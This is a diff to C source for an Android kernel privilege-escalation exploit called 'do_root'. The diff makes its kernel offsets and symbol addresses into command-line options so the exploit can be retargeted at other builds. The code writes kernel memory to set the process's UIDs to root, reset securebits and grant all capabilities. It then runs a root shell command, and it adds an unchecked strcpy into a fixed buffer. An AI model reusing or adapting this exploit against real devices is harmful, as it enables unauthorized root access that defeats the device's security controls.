@@ -40,17 +40,22 @@
 // Linux localhost 4.4.177-g83bee1dc48e8 #1 SMP PREEMPT Mon Jul 22 20:12:03 UTC 2019 aarch64
 // data from `pahole` on my own build with the same .config
 
-#define OFFSET__task_struct__thread_info__flags 0
-#define OFFSET__task_struct__mm 0x520
-#define OFFSET__task_struct__cred 0x790
-#define OFFSET__mm_struct__user_ns 0x300
-#define OFFSET__uts_namespace__name__version 0xc7
+unsigned long OFFSET__task_struct__thread_info__flags=0;
+unsigned long OFFSET__task_struct__mm=0x520;
+unsigned long OFFSET__task_struct__cred=0x790;
+unsigned long OFFSET__mm_struct__user_ns=0x300;
+unsigned long OFFSET__uts_namespace__name__version=0xc7;
+unsigned long OFFSET__task_struct__cred__secbits=0x24;
+unsigned long OFFSET__task_struct__cred__caps=0x30;
+unsigned long OFFSET__task_struct__cred__secptr=0x78;
 // SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
-#define SYMBOL__init_user_ns 0x202f2c8
-#define SYMBOL__init_task 0x20257d0
-#define SYMBOL__init_uts_ns 0x20255c0
+unsigned long SYMBOL__init_user_ns=0x202f2c8;
+unsigned long SYMBOL__init_task=0x20257d0;
+unsigned long SYMBOL__init_uts_ns=0x20255c0;
 
-#define SYMBOL__selinux_enforcing 0x23ce4a8 // Grant: recovered using droidimg+miasm
+unsigned long SYMBOL__selinux_enforcing=0x23ce4a8; // Grant: recovered using droidimg+miasm
+
+unsigned long NUM__task_struct__cred__ids=8; // Number of ID fields in cred struct
 
 void hexdump_memory(unsigned char *buf, size_t byte_count) {
   unsigned long byte_offset_start = 0;
@@ -222,10 +227,8 @@ void kernel_write_uint(unsigned long kaddr, unsigned int data) {
 }
 /// END P0 EXPLOIT ///
 
-static char * program_name = NULL;
-
 void usage() {
-  char * name = program_name ? program_name : "do_root";
+  char * name = "do_root";
   printf("usage: %s [shell|shell_exec]\n"
       "%s shell - spawns an interactive shell\n"
       "%s shell_exec \"command\" - runs the provided command in an escalated shell\n",
@@ -283,8 +286,6 @@ void escalate()
 
   uid_t uid = getuid();
   unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
-  // offset 0x78 is pointer to void * security
-  unsigned long current_cred_security = kernel_read_ulong(my_cred+0x78);
 
   printf("current->cred == 0x%lx\n", my_cred);
 
@@ -296,6 +297,8 @@ void escalate()
   printf("Starting as uid %u\n", uid);
 
 #ifdef DEBUG_RW
+  unsigned long current_cred_security = kernel_read_ulong(my_cred+OFFSET__task_struct__cred__secptr);
+
   kernel_read(my_cred, cred_buf, sizeof(cred_buf));
 
   printf("current->cred\n");
@@ -304,7 +307,7 @@ void escalate()
   kernel_read((current_ptr) & ~0xf, taskbuf, sizeof(taskbuf));
   hexdump_memory(taskbuf, sizeof(taskbuf));
 
-  unsigned long init_cred_security = kernel_read_ulong(init_task_cred+0x78);
+  unsigned long init_cred_security = kernel_read_ulong(init_task_cred+OFFSET__task_struct__cred__secptr);
 
   kernel_read(init_cred_security, cred_buf, 0x20);
   printf("init->security_cred\n");
@@ -318,7 +321,7 @@ void escalate()
   printf("Escalating...\n");
 
   // change IDs to root (there are eight)
-  for (int i = 0; i < 8; i++)
+  for (int i = 0; i < NUM__task_struct__cred__ids; i++)
     kernel_write_uint(my_cred+4 + i*4, 0);
 
   if (getuid() != 0) {
@@ -329,31 +332,13 @@ void escalate()
   printf("UIDs changed to root!\n");
 
   // reset securebits
-  kernel_write_uint(my_cred+0x24, 0);
+  kernel_write_uint(my_cred+OFFSET__task_struct__cred__secbits, 0);
 
   // change capabilities to everything (perm, effective, bounding)
   for (int i = 0; i < 3; i++)
-    kernel_write_ulong(my_cred+0x30 + i*8, 0x3fffffffffUL);
+    kernel_write_ulong(my_cred+OFFSET__task_struct__cred__caps + i*8, 0x3fffffffffUL);
 
   printf("Capabilities set to ALL\n");
-
-  // Grant: this was a failed attempt of just changing my SELinux SID to init's (sid = 7)
-  // It was "working", but my process's pty would hang, so I couldnt interact with a shell
-  // From here I just disabled SELinux
-#if 0
-  // change SID to init
-  for (int i = 0; i < 2; i++)
-    kernel_write_uint(current_cred_security + i*4, 1);
-  printf("[+] before 2\n");
-  kernel_write_uint(current_cred_security + 0, 1);
-  printf("[+] before 3\n");
-  kernel_write_uint(current_cred_security + 8, 7);
-
-  kernel_write_ulong(current_cred_security, 0x0100000001UL);
-
-  kernel_write_uint(current_cred_security + 8, 7);
-  printf("[+] SID -> init (7)\n");
-#endif
 
   // Grant: was checking for this earlier, but it's not set, so I moved on
   // printf("PR_GET_NO_NEW_PRIVS %d\n", prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0));
@@ -428,43 +413,70 @@ void escalate()
 }
 
 int main(int argc, char * argv[]) {
-  if (argc >= 1)
-    program_name = argv[0];
+  char command[255] = "";
+  int option = 0;
 
-  if (argc < 2) {
+  while ((option = getopt(argc, argv,"a:b:c:d:e:f:g:h:i:j:k:l:m:n:")) != -1) {
+      switch (option) {
+            case 'a' :
+                OFFSET__task_struct__thread_info__flags = strtol(optarg, NULL, 16);
+                break;
+            case 'b' :
+                OFFSET__task_struct__mm = strtol(optarg, NULL, 16);
+                break;
+            case 'c' :
+                OFFSET__task_struct__cred = strtol(optarg, NULL, 16);
+                break;
+            case 'd' :
+                OFFSET__mm_struct__user_ns = strtol(optarg, NULL, 16);
+                break;
+            case 'e' :
+                OFFSET__uts_namespace__name__version = strtol(optarg, NULL, 16);
+                break;
+            case 'f' :
+                OFFSET__task_struct__cred__secbits = strtol(optarg, NULL, 16);
+                break;
+            case 'g' :
+                OFFSET__task_struct__cred__caps = strtol(optarg, NULL, 16);
+                break;
+            case 'h' :
+                OFFSET__task_struct__cred__secptr = strtol(optarg, NULL, 16);
+                break;
+            case 'i' :
+                SYMBOL__init_user_ns = strtol(optarg, NULL, 16);
+                break;
+            case 'j' :
+                SYMBOL__init_task = strtol(optarg, NULL, 16);
+                break;
+            case 'k' :
+                SYMBOL__init_uts_ns = strtol(optarg, NULL, 16);
+                break;
+            case 'l' :
+                SYMBOL__selinux_enforcing = strtol(optarg, NULL, 16);
+                break;
+            case 'm' :
+                NUM__task_struct__cred__ids = strtol(optarg, NULL, 16);
+                break;
+            case 'n' :
+                strcpy(command,optarg);
+                break;
+            default:
+                usage(); 
+      }
+  }
+
+  if (!strcmp(command, "")) {
+    printf("shell_exec needs an command\n");
     usage();
   }
 
-  char * applet = argv[1];
-  if (strcmp(applet, "shell_exec") == 0) {
-    if (argc != 3) {
-      printf("shell_exec needs an command\n");
-      usage();
-    }
+  escalate();
 
-    escalate();
+  printf("Executing command \"%s\"\n", command);
 
-    char * command = argv[2];
-
-    printf("Executing command \"%s\"\n", command);
-
-    char * args2[] = {"/system/bin/sh", "-c", command, NULL};
-    execve("/system/bin/sh", args2, NULL);
-    perror("execve");
-    exit(1);
-  } else if (strcmp(applet, "shell") == 0) {
-
-    escalate();
-
-    printf("Spawning shell!\n");
-    char * args2[] = {"/system/bin/sh", NULL};
-    execve("/system/bin/sh", args2, NULL);
-    perror("execve");
-    exit(1);
-  } else {
-    printf("Unknown applet '%s'\n", applet);
-    usage();
-  }
-
+  char * args2[] = {"/system/bin/sh", "-c", command, NULL};
+  execve("/system/bin/sh", args2, NULL);
+  perror("execve");
+  exit(1);
   return 1;
 }
